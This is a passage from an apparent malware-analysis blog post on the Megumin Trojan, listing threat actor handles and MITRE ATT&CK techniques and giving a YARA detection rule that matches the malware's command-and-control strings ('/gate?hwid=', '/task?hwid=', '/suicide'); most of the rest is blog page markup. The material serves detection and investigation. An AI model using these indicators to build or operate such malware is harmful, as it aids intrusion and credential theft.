<li>C:\Users\Administrator\Desktop\MeguminV2\Release\MeguminV2.pdb</li>
</ul>
<h4>Threat Actors</h4>
<ul>
<li>Danij (Main)</li>
<li>Moongod</li>
</ul>
<h2>MITRE ATT&amp;CK</h2>
<ul>
<li><a href="https://attack.mitre.org/techniques/T1059/">Execution &#8211; Command-Line Interface</a></li>
<li><a href="https://attack.mitre.org/techniques/T1053/">Execution &#8211; Schedule Task</a></li>
<li><a href="https://attack.mitre.org/techniques/T1053/">Persistence &#8211; Schedule Task</a></li>
<li><a href="https://attack.mitre.org/techniques/T1060/">Persistence &#8211; Registry Run Keys / Startup Folder</a></li>
<li><a href="https://attack.mitre.org/techniques/T1107/">Defense &#8211; File Deletion</a></li>
<li><a href="https://attack.mitre.org/techniques/T1158/">Defense &#8211; Hidden Files &amp; Directories</a></li>
<li><a href="https://attack.mitre.org/techniques/T1093/">Defense &#8211; Process Hollowing</a></li>
<li><a href="https://attack.mitre.org/techniques/T1053/">Privilege Escalation &#8211; Schedule Task</a></li>
<li><a href="https://attack.mitre.org/techniques/T1081/">Credential Access &#8211; Credentials in File</a></li>
<li><a href="https://attack.mitre.org/techniques/T1115/">Collection &#8211; Clipboard Data</a></li>
</ul>
<h2>Yara</h2>
<pre>rule Megumin : Megumin {
  meta:
    description = "Detecting Megumin v2"
    author = "Fumik0_"
    date = "2019-05-02"

  strings:
    $mz = {4D 5A}

    $s1 = "Megumin/2.0" wide ascii
    $s2 = "/cpu" wide ascii
    $s3 = "/task?hwid=" wide ascii
    $s4 = "/gate?hwid=" wide ascii
    $s5 = "/suicide" wide ascii

  condition:
    $mz at 0 and (all of ($s*))
}</pre>
<h2>Conclusion</h2>
<p>Megumin Trojan is not a complicated malware but about all the one that I have reversed, this is the most talkative one that I&#8217;ve analyzed and possesses a quite some amount of tasks. Let&#8217;s see with the time how this one will evolve, but it&#8217;s confirmed at that time, there is currently a lot of interesting stuff to do with this one :</p>
<ul>
<li>in term of analysis</li>
<li>in term of cybercrime investigation</li>
</ul>
<p><img data-recalc-dims="1" loading="lazy" decoding="async" data-attachment-id="711" data-permalink="https://fumik0.com/2019/05/03/lets-nuke-megumin-trojan/umaru_screen/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/umaru_screen.gif?fit=500%2C407&amp;ssl=1" data-orig-size="500,407" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="umaru_screen" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/umaru_screen.gif?fit=300%2C244&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/umaru_screen.gif?fit=500%2C407&amp;ssl=1" class=" size-full wp-image-711 aligncenter" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2019/05/umaru_screen.gif?resize=500%2C407&#038;ssl=1" alt="umaru_screen" width="500" height="407" /></p>
<p>#HappyHunting<br />
#WeebMalware</p>
<p>Special Thanks: <a href="https://twitter.com/siri_urz">S!Ri</a></p>
<p>Photo by <a href="https://unsplash.com/photos/-N1_Vhyqd50?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText">Jens Johnsson</a> on <a href="https://unsplash.com/search/photos/explosion?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText">Unsplash</a></p>
<div class="sharedaddy sd-sharing-enabled"><div class="robots-nocontent sd-block sd-social sd-social-icon-text sd-sharing"><h3 class="sd-title">Share this:</h3><div class="sd-content"><ul><li class="share-twitter"><a rel="nofollow noopener noreferrer" data-shared="sharing-twitter-660" class="share-twitter sd-button share-icon" href="https://fumik0.com/2019/05/03/lets-nuke-megumin-trojan/?share=twitter" target="_blank" title="Click to share on Twitter" ><span>Twitter</span></a></li><li class="share-facebook"><a rel="nofollow noopener noreferrer" data-shared="sharing-facebook-660" class="share-facebook sd-button share-icon" href="https://fumik0.com/2019/05/03/lets-nuke-megumin-trojan/?share=facebook" target="_blank" title="Click to share on Facebook" ><span>Facebook</span></a></li><li class="share-end"></li></ul></div></div></div><div class='sharedaddy sd-block sd-like jetpack-likes-widget-wrapper jetpack-likes-widget-unloaded' id='like-post-wrapper-140610880-660-676244794ecda' data-src='https://widgets.wp.com/likes/?ver=14.2-a.3#blog_id=140610880&amp;post_id=660&amp;origin=fumik0.com&amp;obj_id=140610880-660-676244794ecda&amp;n=1' data-name='like-post-frame-140610880-660-676244794ecda' data-title='Like or Reblog'><h3 class="sd-title">Like this:</h3><div class='likes-widget-placeholder post-likes-widget-placeholder' style='height: 55px;'><span class='button'><span>Like</span></span> <span class="loading">Loading...</span></div><span class='sd-text-color'></span><a class='sd-link-color'></a></div>
															</div>

						</article>

						<section class="modified-date" itemprop="dateModified" content="2019-05-06T08:01:28+00:00">
							Last modified: May 6, 2019						</section>

						<section class="tags">
													</section>

																<h3 class="section-title">Author</h3>
			<aside class="author-card" itemscope itemprop="author" itemtype="http://schema.org/Person">
				<div class="author-avatar">
					<img src="https://secure.gravatar.com/avatar/60460a1a0d00b32720a59ee2624bb4aa?s=96&#038;d=identicon&#038;r=g" class="rounded-circle" itemprop="image">
				</div>
				<div class="author-info">
					<div class="author-title">
						<a href="https://fumik0.com/author/fumko/" itemprop="name">
							fumko						</a>
					</div>
					<div class="author-description" itemprop="description">  
											</div>
				</div>
			</aside>
								
													
<div id="comments" class="discussion-wrapper">
	<h3 class="section-title">Comments</h3>
	<div class="discussion-timeline">
								
		<div id="respond" class="comment-respond">
			<h3 id="reply-title" class="comment-reply-title">Leave a Reply<small><a rel="nofollow" id="cancel-comment-reply-link" href="/2019/05/03/lets-nuke-megumin-trojan/#respond" style="display:none;">Cancel reply</a></small></h3>			<form id="commentform" class="comment-form">
				<iframe
					title="Comment Form"
					src="https://jetpack.wordpress.com/jetpack-comment/?blogid=140610880&#038;postid=660&#038;comment_registration=0&#038;require_name_email=1&#038;stc_enabled=1&#038;stb_enabled=1&#038;show_avatars=1&#038;avatar_default=identicon&#038;greeting=Leave+a+Reply&#038;jetpack_comments_nonce=cf0fc46ea4&#038;greeting_reply=Leave+a+Reply+to+%25s&#038;color_scheme=light&#038;lang=en_US&#038;jetpack_version=14.2-a.3&#038;iframe_unique_id=1&#038;show_cookie_consent=10&#038;has_cookie_consent=0&#038;is_current_user_subscribed=0&#038;token_key=%3Bnormal%3B&#038;sig=1042468777d5979c702a5d81b3b60e8fd164906a#parent=https%3A%2F%2Ffumik0.com%2F2019%2F05%2F03%2Flets-nuke-megumin-trojan%2F"
											name="jetpack_remote_comment"
						style="width:100%; height: 430px; border:0;"
										class="jetpack_remote_comment"
					id="jetpack_remote_comment"
					sandbox="allow-same-origin allow-top-navigation allow-scripts allow-forms allow-popups"
				>
									</iframe>
									<!--[if !IE]><!-->
					<script>
						document.addEventListener('DOMContentLoaded', function () {
							var commentForms = document.getElementsByClassName('jetpack_remote_comment');
							for (var i = 0; i < commentForms.length; i++) {
								commentForms[i].allowTransparency = false;
								commentForms[i].scrolling = 'no';
							}
						});
					</script>
					<!--<![endif]-->
							</form>
		</div>

		
		<input type="hidden" name="comment_parent" id="comment_parent" value="" />

			</div>
</div>

												
					
							</main>

							<aside id="aside-container" class="col-lg-4 col-md-4 col-sm-12" role="complementary">
					
	<div id="sidebar" class="sidebar">
		<section id="categories-3" class="widget widget_categories"><h2 class="widget-title">Categories</h2>
			<ul>
					<li class="cat-item cat-item-602944907"><a href="https://fumik0.com/category/botnet/">botnet</a> (2)
</li>
	<li class="cat-item cat-item-602944904"><a href="https://fumik0.com/category/projects/">Projects</a> (1)
</li>
	<li class="cat-item cat-item-602944906"><a href="https://fumik0.com/category/reverse/">Reverse</a> (7)
</li>
	<li class="cat-item cat-item-1"><a href="https://fumik0.com/category/uncategorized/">Uncategorized</a> (3)
</li>
			</ul>

			</section><section id="archives-3" class="widget widget_archive"><h2 class="widget-title">Archives</h2>
			<ul>
					<li><a href='https://fumik0.com/2021/06/'>June 2021</a></li>
	<li><a href='https://fumik0.com/2021/04/'>April 2021</a></li>
	<li><a href='https://fumik0.com/2019/12/'>December 2019</a></li>
	<li><a href='https://fumik0.com/2019/08/'>August 2019</a></li>
	<li><a href='https://fumik0.com/2019/05/'>May 2019</a></li>
	<li><a href='https://fumik0.com/2019/03/'>March 2019</a></li>
	<li><a href='https://fumik0.com/2019/02/'>February 2019</a></li>
	<li><a href='https://fumik0.com/2018/12/'>December 2018</a></li>
	<li><a href='https://fumik0.com/2018/10/'>October 2018</a></li>
	<li><a href='https://fumik0.com/2018/05/'>May 2018</a></li>
	<li><a href='https://fumik0.com/2018/01/'>January 2018</a></li>
			</ul>

			</section>	</div>

	<div id="sidebar-sticky" class="sidebar sticky-top">
		<nav id="toc" class="toc" role="navigation"></nav>
	</div>
				</aside>
			
		</div><!-- .row -->
		
	<nav class="navigation post-navigation" aria-label="Posts">
		<h2 class="screen-reader-text">Post navigation</h2>
		<div class="nav-links"><div class="nav-previous"><a href="https://fumik0.com/2019/03/25/lets-play-with-qulab-an-exotic-malware-developed-in-autoit/" rel="prev"><i class="fas fa-angle-left"></i> <span class="screen-reader-text">Previous Post</span> Let&#8217;s play with Qulab, an exotic malware developed in AutoIT</a></div><div class="nav-next"><a href="https://fumik0.com/2019/05/24/overview-of-proton-bot-another-loader-in-the-wild/" rel="next"><i class="fas fa-angle-right"></i> <span class="screen-reader-text">Next Post</span> Overview of Proton Bot, another loader in the wild!</a></div></div>
	</nav>	</div><!-- .container -->
</div><!-- .data-schema -->


			<footer class="footer" role="contentinfo">
								<section class="footer-sidebar">
					<div class="container px-responsive">
						<div class="row my-4">
							<section id="rss_links-5" class="widget widget_rss_links col-lg col-md-4 col-sm-12"><p><a target="_self" href="https://fumik0.com/feed/" title="Subscribe to posts"><img src="https://fumik0.com/wp-content/plugins/jetpack/images/rss/orange-small.png" alt="RSS feed" /></a></p>
</section>						</div>
					</div>
				</section>
				
				<div class="container footer-columns">
					<div class="footer-column-left">
						<div>Copyright &copy; 2024 <strong><a href="https://fumik0.com">Fumik0_&#039;s box</a></strong>. All rights reserved. Theme by <a href="https://terryl.in/" target="_blank">Mynote</a>. </div>
						<div></div>
					</div>
					<div class="footer-column-right">
						<nav class="footer-nav"><ul id="menu-social-media" class="social-icon-links"><li id="menu-item-273"><a href="http://tracker.fumik0.com"><i class="fas fa-link"></i></a></li>
<li id="menu-item-13"><a target="_blank" href="https://twitter.com/fumik0_"><span class="brand-sm"><i class="fab fa-twitter twitter brand-link"></i></span></a></li>
<li id="menu-item-424"><a href="https://github.com/Fmk0"><span class="brand-sm"><i class="fab fa-github-alt github brand-link"></i></span></a></li>
<li id="menu-item-426"><a href="https://www.youtube.com/channel/UClEmTjO2nLjbwGht-OckQhA"><span class="brand-sm"><i class="fab fa-youtube youtube brand-link"></i></span></a></li>
</ul></nav>					</div>
				</div>

			</footer>
		</div><!-- .wrapper -->
			<script>

	jQuery( document ).ready(function( $ ) {
		const win = $( window );
		const doc = $( document );
		const progressBar = $( 'progress' );
		const progressLabel = $( '.progress-label' );
		const setValue = () => win.scrollTop();
		const setMax = () => doc.height() - win.height();
		const setPercent = () => Math.round( win.scrollTop() / (doc.height() - win.height()) * 100 );
		const pageTitle = $( '#post-title' );
		const pageTitleTop = pageTitle.offset().top;
		const progressBarContainer = $( '.single-post-title-bar' );
		const headerNavBrand = $( '.header .navbar-brand' );
		const progressTitle = $( '#progress-title' );
		const headerBarContainer = $( '.header .container' );

		progressLabel.text( setPercent() + '%' );
		progressBar.attr(
			{
				value: setValue(),
				max: setMax() 
			}
		);

		doc.on( 'scroll', () => {
			progressLabel.text( setPercent() + '%' );
			progressBar.attr(
				{
					value: setValue()
				} 
			);

			if ( doc.scrollTop() > headerNavBrand.height() ) {
				//headerBarContainer.fadeOut( 800 );
				progressTitle.html( pageTitle.html() );
				progressBarContainer.find( '.navbar-brand' ).html( headerNavBrand.html() );
				progressBarContainer.fadeIn( 100 );
				progressBarContainer.addClass( 'fixed-top' );
				progressBarContainer.addClass( 'slide-down' );
			} else {
				//headerBarContainer.fadeIn( 800 );
				progressBarContainer.removeClass( 'slide-down' );
				progressBarContainer.fadeOut( 100 );

				if ( progressBarContainer.hasClass( 'fixed-top' ) ) {
					setTimeout(function() {
						progressBarContainer.removeClass( 'fixed-top' );
					}, 500);
				}
			}
		});

		win.on( 'resize', () => {
			progressLabel.text( setPercent() + '%' );
			progressBar.attr(
				{
					value: setValue(), 
					max: setMax()
				} 
			);
		});

		// Sidebar switcher
		$( '#main-container' ).attr( 'data-previous-class', $( '#main-container' ).attr( 'class' ) );

		$( '.column-control .btn-counter' ).click(function() {
			var target = $( this ).attr( 'data-target' );
			if ( $( this ).hasClass( 'active' ) ) {
				$( this ).removeClass( 'active' );

				if ( target == '#aside-container' ) {
					$( '#main-container' ).attr( 'data-previous-class', $( '#main-container' ).attr( 'class' ) );
					$( '#main-container' ).attr( 'class', 'col col-sm-12' );
					$( '#aside-container' ).hide();
				}
				if ( target == '#sidebar') {
					$( target ).show();
				}
			} else {
				$( this ).addClass( 'active' );

				if ( target == '#aside-container' ) {
					$( '#main-container' ).attr( 'class', $( '#main-container' ).attr( 'data-previous-class' ) );
					$( '#aside-container' ).show();
				}
				if ( target == '#sidebar') {
					$( target ).hide();
				}
			}

		});

		// For responsive.
		$( '.markdown-body img' ).attr('height', '');
	});

	</script>
	<script>

	jQuery( document ).ready(function( $ ) {

		$( '.scroll-area a' ).on( 'click', function(e) {
			e.preventDefault();
			var movingPosition = 0;

			if ( $( this.hash ).offset().top > $( document ).height() - $( window ).height() ) {
				movingPosition = $( document ).height() - $( window ).height();
			} else {
				movingPosition = $( this.hash ).offset().top;
			}

			$( 'html, body' ).animate({
				scrollTop: movingPosition
			}, 500, 'swing' );
		});

		$( 'a.go-top' ).on( 'click' ,function(e) {
			e.preventDefault();
			$( 'html, body' ).animate( { scrollTop: 0 }, 1000 );
		});

		$( window ).scroll( function() {      
			var windowTop =  $( window ).scrollTop();
			if ( windowTop > 100 ) {
				$( 'a.go-top' ).fadeIn( 300 );
			} else {
				$( 'a.go-top' ).fadeOut( 300 );
			}
		});

		$( '#mynote-nav-bar' ).on( 'show.bs.collapse' , function () {
			$( 'body' ).addClass( 'menu-is-collapsed' );
			$( '.main-header' ).css( { 'top': '-60px' } ).animate( { 'top': '0px' }, 500 );
			$( '.has-site-logo .search-bar' ).fadeOut( 500 );
		});

		$( '#mynote-nav-bar' ).on( 'hidden.bs.collapse' , function () {
			$( '.main-header' ).css( { 'top': '0px' } ).animate( { 'top': '-60px' }, 500 );
			$( '.has-site-logo .search-bar' ).fadeIn( 500 );
			setTimeout(function() {
				$( 'body' ).removeClass( 'menu-is-collapsed' );
			}, 500);
			
		});
	});

	</script>
	<!--  -->
<script defer id="bilmur" data-customproperties="{&quot;woo_active&quot;:&quot;0&quot;}" data-provider="wordpress.com" data-service="atomic"  src="https://s0.wp.com/wp-content/js/bilmur.min.js?m=202451"></script>
					<div class="jetpack-subscription-modal">
						<div class="jetpack-subscription-modal__modal-content">
								
	<div class="wp-block-group has-border-color jetpack-subscription-modal__modal-content-form" style="border-color:#dddddd;border-width:1px;margin-top:0;margin-bottom:0;padding:32px"><div class="wp-block-group__inner-container is-layout-flow wp-block-group-is-layout-flow">

		
		<h2 class="wp-block-heading has-text-align-center" style="margin-top:4px;margin-bottom:10px;font-size:26px;font-style:normal;font-weight:600">Discover more from Fumik0_&#039;s box</h2>
		

		
		<p class='has-text-align-center' style='margin-top:4px;margin-bottom:0px;font-size:15px'>Subscribe now to keep reading and get access to the full archive.</p>
		

			<div class="wp-block-jetpack-subscriptions__supports-newline is-style-compact wp-block-jetpack-subscriptions">
		<div class="wp-block-jetpack-subscriptions__container is-not-subscriber">
							<form
					action="https://wordpress.com/email-subscriptions"
					method="post"
					accept-charset="utf-8"
					data-blog="140610880"
					data-post_access_level="everybody"
					data-subscriber_email=""
					id="subscribe-blog"
				>
					<div class="wp-block-jetpack-subscriptions__form-elements">
												<p id="subscribe-email">
							<label
								id="subscribe-field-label"
								for="subscribe-field"
								class="screen-reader-text"
							>
								Type your email…							</label>
							<input
									required="required"
									type="email"
									name="email"
									
									style="font-size: 16px;padding: 15px 23px 15px 23px;border-radius: 50px;border-width: 1px;"
									placeholder="Type your email…"
									value=""
									id="subscribe-field"
									title="Please fill in this field."
								/>						</p>
												<p id="subscribe-submit"
													>
							<input type="hidden" name="action" value="subscribe"/>
							<input type="hidden" name="blog_id" value="140610880"/>
							<input type="hidden" name="source" value="https://fumik0.com/2019/05/03/lets-nuke-megumin-trojan/"/>
							<input type="hidden" name="sub-type" value="subscribe-block"/>
							<input type="hidden" name="app_source" value="atomic-subscription-modal-lo"/>
							<input type="hidden" name="redirect_fragment" value="subscribe-blog"/>
							<input type="hidden" name="lang" value="en_US"/>
							<input type="hidden" id="_wpnonce" name="_wpnonce" value="c43f937e1f" /><input type="hidden" name="_wp_http_referer" value="/2019/05/03/lets-nuke-megumin-trojan/" /><input type="hidden" name="post_id" value="660"/>							<button type="submit"
																	class="wp-block-button__link"
																									style="font-size: 16px;padding: 15px 23px 15px 23px;margin: 0; margin-left: 10px;border-radius: 50px;border-width: 1px;"
																name="jetpack_subscriptions_widget"
							>
								Subscribe							</button>
						</p>
					</div>
				</form>
								</div>
	</div>
	

		
		<p class="has-text-align-center jetpack-subscription-modal__close" style="margin-top:20px;font-size:14px"><a href="#">Continue reading</a></p>
		
	</div></div>
							</div>
					</div>
					<div id="jp-carousel-loading-overlay">
			<div id="jp-carousel-loading-wrapper">
				<span id="jp-carousel-library-loading">&nbsp;</span>
			</div>
		</div>
		<div class="jp-carousel-overlay" style="display: none;">

		<div class="jp-carousel-container">
			<!-- The Carousel Swiper -->
			<div
				class="jp-carousel-wrap swiper-container jp-carousel-swiper-container jp-carousel-transitions"
				itemscope
				itemtype="https://schema.org/ImageGallery">
				<div class="jp-carousel swiper-wrapper"></div>
				<div class="jp-swiper-button-prev swiper-button-prev">
					<svg width="25" height="24" viewBox="0 0 25 24" fill="none" xmlns="http://www.w3.org/2000/svg">
						<mask id="maskPrev" mask-type="alpha" maskUnits="userSpaceOnUse" x="8" y="6" width="9" height="12">
							<path d="M16.2072 16.59L11.6496 12L16.2072 7.41L14.8041 6L8.8335 12L14.8041 18L16.2072 16.59Z" fill="white"/>
						</mask>
						<g mask="url(#maskPrev)">
							<rect x="0.579102" width="23.8823" height="24" fill="#FFFFFF"/>
						</g>
					</svg>
				</div>
				<div class="jp-swiper-button-next swiper-button-next">
					<svg width="25" height="24" viewBox="0 0 25 24" fill="none" xmlns="http://www.w3.org/2000/svg">
						<mask id="maskNext" mask-type="alpha" maskUnits="userSpaceOnUse" x="8" y="6" width="8" height="12">
							<path d="M8.59814 16.59L13.1557 12L8.59814 7.41L10.0012 6L15.9718 12L10.0012 18L8.59814 16.59Z" fill="white"/>
						</mask>
						<g mask="url(#maskNext)">
							<rect x="0.34375" width="23.8822" height="24" fill="#FFFFFF"/>
						</g>
					</svg>
				</div>
			</div>
			<!-- The main close buton -->
			<div class="jp-carousel-close-hint">
				<svg width="25" height="24" viewBox="0 0 25 24" fill="none" xmlns="http://www.w3.org/2000/svg">
					<mask id="maskClose" mask-type="alpha" maskUnits="userSpaceOnUse" x="5" y="5" width="15" height="14">
						<path d="M19.3166 6.41L17.9135 5L12.3509 10.59L6.78834 5L5.38525 6.41L10.9478 12L5.38525 17.59L6.78834 19L12.3509 13.41L17.9135 19L19.3166 17.59L13.754 12L19.3166 6.41Z" fill="white"/>
					</mask>
					<g mask="url(#maskClose)">
						<rect x="0.409668" width="23.8823" height="24" fill="#FFFFFF"/>
					</g>
				</svg>
			</div>
			<!-- Image info, comments and meta -->
			<div class="jp-carousel-info">
				<div class="jp-carousel-info-footer">
					<div class="jp-carousel-pagination-container">
						<div class="jp-swiper-pagination swiper-pagination"></div>
						<div class="jp-carousel-pagination"></div>
					</div>
					<div class="jp-carousel-photo-title-container">
						<h2 class="jp-carousel-photo-caption"></h2>
					</div>
					<div class="jp-carousel-photo-icons-container">
						<a href="#" class="jp-carousel-icon-btn jp-carousel-icon-info" aria-label="Toggle photo metadata visibility">
							<span class="jp-carousel-icon">
								<svg width="25" height="24" viewBox="0 0 25 24" fill="none" xmlns="http://www.w3.org/2000/svg">
									<mask id="maskInfo" mask-type="alpha" maskUnits="userSpaceOnUse" x="2" y="2" width="21" height="20">
										<path fill-rule="evenodd" clip-rule="evenodd" d="M12.7537 2C7.26076 2 2.80273 6.48 2.80273 12C2.80273 17.52 7.26076 22 12.7537 22C18.2466 22 22.7046 17.52 22.7046 12C22.7046 6.48 18.2466 2 12.7537 2ZM11.7586 7V9H13.7488V7H11.7586ZM11.7586 11V17H13.7488V11H11.7586ZM4.79292 12C4.79292 16.41 8.36531 20 12.7537 20C17.142 20 20.7144 16.41 20.7144 12C20.7144 7.59 17.142 4 12.7537 4C8.36531 4 4.79292 7.59 4.79292 12Z" fill="white"/>
									</mask>
									<g mask="url(#maskInfo)">
										<rect x="0.8125" width="23.8823" height="24" fill="#FFFFFF"/>
									</g>
								</svg>
							</span>
						</a>
												<a href="#" class="jp-carousel-icon-btn jp-carousel-icon-comments" aria-label="Toggle photo comments visibility">
							<span class="jp-carousel-icon">
								<svg width="25" height="24" viewBox="0 0 25 24" fill="none" xmlns="http://www.w3.org/2000/svg">
									<mask id="maskComments" mask-type="alpha" maskUnits="userSpaceOnUse" x="2" y="2" width="21" height="20">
										<path fill-rule="evenodd" clip-rule="evenodd" d="M4.3271 2H20.2486C21.3432 2 22.2388 2.9 22.2388 4V16C22.2388 17.1 21.3432 18 20.2486 18H6.31729L2.33691 22V4C2.33691 2.9 3.2325 2 4.3271 2ZM6.31729 16H20.2486V4H4.3271V18L6.31729 16Z" fill="white"/>
									</mask>
									<g mask="url(#maskComments)">
										<rect x="0.34668" width="23.8823" height="24" fill="#FFFFFF"/>
									</g>
								</svg>

								<span class="jp-carousel-has-comments-indicator" aria-label="This image has comments."></span>
							</span>
						</a>
											</div>
				</div>
				<div class="jp-carousel-info-extra">
					<div class="jp-carousel-info-content-wrapper">
						<div class="jp-carousel-photo-title-container">
							<h2 class="jp-carousel-photo-title"></h2>
						</div>
						<div class="jp-carousel-comments-wrapper">
															<div id="jp-carousel-comments-loading">
									<span>Loading Comments...</span>
								</div>
								<div class="jp-carousel-comments"></div>
								<div id="jp-carousel-comment-form-container">
									<span id="jp-carousel-comment-form-spinner">&nbsp;</span>
									<div id="jp-carousel-comment-post-results"></div>
																														<form id="jp-carousel-comment-form">
												<label for="jp-carousel-comment-form-comment-field" class="screen-reader-text">Write a Comment...</label>
												<textarea
													name="comment"
													class="jp-carousel-comment-form-field jp-carousel-comment-form-textarea"
													id="jp-carousel-comment-form-comment-field"
													placeholder="Write a Comment..."
												></textarea>
												<div id="jp-carousel-comment-form-submit-and-info-wrapper">
													<div id="jp-carousel-comment-form-commenting-as">
																													<fieldset>
																<label for="jp-carousel-comment-form-email-field">Email (Required)</label>
																<input type="text" name="email" class="jp-carousel-comment-form-field jp-carousel-comment-form-text-field" id="jp-carousel-comment-form-email-field" />
															</fieldset>
															<fieldset>
																<label for="jp-carousel-comment-form-author-field">Name (Required)</label>
																<input type="text" name="author" class="jp-carousel-comment-form-field jp-carousel-comment-form-text-field" id="jp-carousel-comment-form-author-field" />
															</fieldset>
															<fieldset>
																<label for="jp-carousel-comment-form-url-field">Website</label>
																<input type="text" name="url" class="jp-carousel-comment-form-field jp-carousel-comment-form-text-field" id="jp-carousel-comment-form-url-field" />
															</fieldset>
																											</div>
													<input
														type="submit"
														name="submit"
														class="jp-carousel-comment-form-button"
														id="jp-carousel-comment-form-button-submit"
														value="Post Comment" />
												</div>
											</form>
																											</div>
													</div>
						<div class="jp-carousel-image-meta">
							<div class="jp-carousel-title-and-caption">
								<div class="jp-carousel-photo-info">
									<h3 class="jp-carousel-caption" itemprop="caption description"></h3>
								</div>

								<div class="jp-carousel-photo-description"></div>
							</div>
							<ul class="jp-carousel-image-exif" style="display: none;"></ul>
							<a class="jp-carousel-image-download" href="#" target="_blank" style="display: none;">
								<svg width="25" height="24" viewBox="0 0 25 24" fill="none" xmlns="http://www.w3.org/2000/svg">
									<mask id="mask0" mask-type="alpha" maskUnits="userSpaceOnUse" x="3" y="3" width="19" height="18">
										<path fill-rule="evenodd" clip-rule="evenodd" d="M5.84615 5V19H19.7775V12H21.7677V19C21.7677 20.1 20.8721 21 19.7775 21H5.84615C4.74159 21 3.85596 20.1 3.85596 19V5C3.85596 3.9 4.74159 3 5.84615 3H12.8118V5H5.84615ZM14.802 5V3H21.7677V10H19.7775V6.41L9.99569 16.24L8.59261 14.83L18.3744 5H14.802Z" fill="white"/>
									</mask>
									<g mask="url(#mask0)">
										<rect x="0.870605" width="23.8823" height="24" fill="#FFFFFF"/>
									</g>
								</svg>
								<span class="jp-carousel-download-text"></span>
							</a>
							<div class="jp-carousel-image-map" style="display: none;"></div>
						</div>
					</div>
				</div>
			</div>
		</div>

		</div>
		
	<script type="text/javascript">
		window.WPCOM_sharing_counts = {"https:\/\/fumik0.com\/2019\/05\/03\/lets-nuke-megumin-trojan\/":660};
	</script>
				<link rel='stylesheet' id='jetpack-carousel-swiper-css-css' href='https://fumik0.com/wp-content/plugins/jetpack/modules/carousel/swiper-bundle.css?ver=14.2-a.3' type='text/css' media='all' />
<link rel='stylesheet' id='jetpack-carousel-css' href='https://fumik0.com/wp-content/plugins/jetpack/modules/carousel/jetpack-carousel.css?ver=14.2-a.3' type='text/css' media='all' />
<link rel='stylesheet' id='tiled-gallery-css' href='https://fumik0.com/wp-content/plugins/jetpack/modules/tiled-gallery/tiled-gallery/tiled-gallery.css?ver=2023-08-21' type='text/css' media='all' />
<link rel='stylesheet' id='jetpack-block-subscriptions-css' href='https://fumik0.com/wp-content/plugins/jetpack/_inc/blocks/subscriptions/view.css?minify=false&#038;ver=14.2-a.3' type='text/css' media='all' />
<script type="text/javascript" src="https://c0.wp.com/c/6.7.1/wp-includes/js/comment-reply.min.js" id="comment-reply-js" async="async" data-wp-strategy="async"></script>
<script type="text/javascript" src="https://c0.wp.com/c/6.7.1/wp-includes/js/dist/dom-ready.min.js" id="wp-dom-ready-js"></script>
<script type="text/javascript" id="subscription-modal-js-js-extra">
/* <![CDATA[ */
var subscriptionData = {"homeUrl":"fumik0.com"};
/* ]]> */
</script>
<script type="text/javascript" src="https://fumik0.com/wp-content/plugins/jetpack/modules/comments/subscription-modal-on-comment/subscription-modal.js?ver=14.2-a.3" id="subscription-modal-js-js"></script>
<script type="text/javascript" src="https://fumik0.com/wp-content/plugins/jetpack/_inc/build/likes/queuehandler.min.js?ver=14.2-a.3" id="jetpack_likes_queuehandler-js"></script>
<script type="text/javascript" src="https://c0.wp.com/c/6.7.1/wp-includes/js/clipboard.min.js" id="clipboard-js"></script>
<script type="text/javascript" src="https://fumik0.com/wp-content/plugins/highlighting-code-block/assets/js/prism.js?ver=1.2.9" id="hcb-prism-js"></script>
<script type="text/javascript" id="hcb-script-js-extra">
/* <![CDATA[ */
var hcbVars = {"showCopy":"on"};
/* ]]> */
</script>
<script type="text/javascript" src="https://fumik0.com/wp-content/plugins/highlighting-code-block/build/js/hcb_script.js?ver=1.2.9" id="hcb-script-js"></script>
<script type="text/javascript" src="https://stats.wp.com/e-202451.js" id="jetpack-stats-js" data-wp-strategy="defer"></script>
<script type="text/javascript" id="jetpack-stats-js-after">
/* <![CDATA[ */
_stq = window._stq || [];
_stq.push([ "view", JSON.parse("{\"v\":\"ext\",\"blog\":\"140610880\",\"post\":\"660\",\"tz\":\"0\",\"srv\":\"fumik0.com\",\"hp\":\"atomic\",\"ac\":\"2\",\"amp\":\"0\",\"j\":\"1:14.2-a.3\"}") ]);
_stq.push([ "clickTrackerInit", "140610880", "660" ]);
/* ]]> */
</script>
<script type="text/javascript" id="jetpack-carousel-js-extra">
/* <![CDATA[ */
var jetpackSwiperLibraryPath = {"url":"https:\/\/fumik0.com\/wp-content\/plugins\/jetpack\/_inc\/build\/carousel\/swiper-bundle.min.js"};
var jetpackCarouselStrings = {"widths":[370,700,1000,1200,1400,2000],"is_logged_in":"","lang":"en","ajaxurl":"https:\/\/fumik0.com\/wp-admin\/admin-ajax.php","nonce":"acafc58171","display_exif":"1","display_comments":"1","single_image_gallery":"1","single_image_gallery_media_file":"","background_color":"black","comment":"Comment","post_comment":"Post Comment","write_comment":"Write a Comment...","loading_comments":"Loading Comments...","image_label":"Open image in full-screen.","download_original":"View full size <span class=\"photo-size\">{0}<span class=\"photo-size-times\">\u00d7<\/span>{1}<\/span>","no_comment_text":"Please be sure to submit some text with your comment.","no_comment_email":"Please provide an email address to comment.","no_comment_author":"Please provide your name to comment.","comment_post_error":"Sorry, but there was an error posting your comment. Please try again later.","comment_approved":"Your comment was approved.","comment_unapproved":"Your comment is in moderation.","camera":"Camera","aperture":"Aperture","shutter_speed":"Shutter Speed","focal_length":"Focal Length","copyright":"Copyright","comment_registration":"0","require_name_email":"1","login_url":"https:\/\/fumik0.com\/wp-login.php?redirect_to=https%3A%2F%2Ffumik0.com%2F2019%2F05%2F03%2Flets-nuke-megumin-trojan%2F","blog_id":"1","meta_data":["camera","aperture","shutter_speed","focal_length","copyright"]};
